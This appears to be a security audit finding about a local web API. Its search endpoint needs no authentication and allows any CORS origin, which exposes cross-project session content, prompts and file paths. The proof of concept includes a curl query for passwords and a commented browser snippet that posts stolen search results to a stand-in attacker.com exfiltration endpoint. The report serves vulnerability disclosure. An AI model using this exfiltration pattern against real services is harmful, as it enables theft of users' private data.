# Unauthenticated cross-project search

**Verification: CODE-VERIFIED**

## Description
Cross-project search returns session content, scheduled prompts, artifact absolute paths with CORS fully open.

## Impact
Any local process or web page reads cross-project data.

## PoC
```bash
```bash
# No auth headers needed; CORS is '*' so works from browser:
curl "http://localhost:8000/api/v1/search?q=password"

# From a malicious web page in operator's browser:
# fetch("http://localhost:8000/api/v1/search?q=secret")
#   .then(r=>r.json())
#   .then(data => fetch("https://attacker.com/exfil", {
#     method: "POST", body: JSON.stringify(data)
#   }))
```
```

## Execution result
```
Code path analysis: no auth dependency; queries all projects; CORS is wildcard.
```
